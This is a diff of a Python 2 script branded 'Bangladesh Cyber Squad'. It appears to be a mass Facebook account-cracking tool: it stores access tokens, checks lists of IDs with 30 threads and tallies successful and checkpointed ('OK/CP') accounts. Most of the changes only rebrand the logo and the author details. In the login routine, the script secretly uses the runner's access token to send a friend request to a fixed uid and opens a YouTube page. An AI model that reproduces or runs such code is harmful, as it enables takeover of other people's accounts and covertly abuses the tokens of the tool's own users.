@@ -48,20 +48,20 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.07)
 
-#Dev:Mohammed Mishat
+#Dev:Md Mishat
 ##### LOGO #####
 logo = """
  \033[1;97#### ####                                 
-    /|    / / //   ) ) /__  ___/ 
-   //|   / / ((          / /     
-  // |  / /    \\       / /      
- //  | / /       ) )   / /       
-//   |/ / ((___ / /   / /        
+/__  ___/       //   / /       //   ) ) 
+   / /          //__ / /       //        
+  / /          //__  /        //  ____   
+ / /          //   \ \       //    / /   
+/ /          //     \ \     ((____/ /
 \033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;97mAuthor©\033[1;97m: \033[1;92mMohammed Mishat
-\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Mishat.BCS.0
-\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Mishat.BCS.0
-\033[1;97mWhatsapp\033[1;97m: \033[1;92m+8801760743760
+\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Mohammed Mishat
+\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Mohammed Mishat
+\033[1;97mWhatsapp\033[1;97m: \033[1;92m+
 \033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"""
 
 def tik():
@@ -93,14 +93,14 @@ print  """
       \033[1;97m█████ 80% *___*
        \033[1;96m██████ 100% *___*
 \033[1;91m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;93m๑۩۩๑\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;91mAuthor©\033[1;91m: \033[1;93mMohammed Mishat
-\033[1;91mInstagram\033[1;91m: \033[1;93mhttps://www.Instagram.com/Mishat.BCS.01
-\033[1;91mFacebook\033[1;91m: \033[1;93mhttps://www.facebook.com/Mishat.BCS.0
-\033[1;91mWhatsapp\033[1;91m: \033[1;93m+01*******
+\033[1;91mAuthor©\033[1;91m: \033[1;93mMd Mishat
+\033[1;91mInstagram\033[1;91m: \033[1;93mhttps://www.Instagram.com/Mohammed Mishat
+\033[1;91mFacebook\033[1;91m: \033[1;93mhttps://www.facebook.com/Mohammed Mishat
+\033[1;91mWhatsapp\033[1;91m: \033[1;93m+
 \033[1;91m«--------------------\033[1;93m✧\033[1;91m--------------------»"""
 jalan('              \033[1;91mREAD CAREFULLY:')
 jalan("\033[1;97m Tool Username And Password  ")
-jalan('\033[1;97m    Username Mishat Password Mishat  M is Big Letter ')
+jalan('\033[1;97m    Username Mishat Password Mishat ')
 jalan("\033[1;97m    ██████ 100%  ")
 
 print "\033[1;91m«-------------\033[1;93mLogin With Tool\033[1;91m-------------»"
@@ -166,7 +166,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful...'
-				os.system('xdg-open https://www.youtube.com/BCS')
+				os.system('xdg-open https://www.youtube.com/noakhali')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -418,7 +418,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	print "  \033[1;91m«---------Developed By Bangladesh Cyber Squad ------------»" #Dev:Mohammed Mishat
+	print "  \033[1;91m«---------Developed By Bangladesh Cyber Squad------------»" #Dev:Md Mishat
 	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print """
@@ -428,7 +428,7 @@ def pilih_super():
                  {=  ^  =}
                   >  -  <
 .-------------.""`-------`"".-------------.
-: \033[1;92m     Hope You Bangladesh Cyber Squad  \033[1;93m :
+: \033[1;92m     Hope You Bangladesh Cyber Squad   \033[1;93m :
 '-----------------------------------------' 
                 ___)( )(___
                (((__) (__)))"""
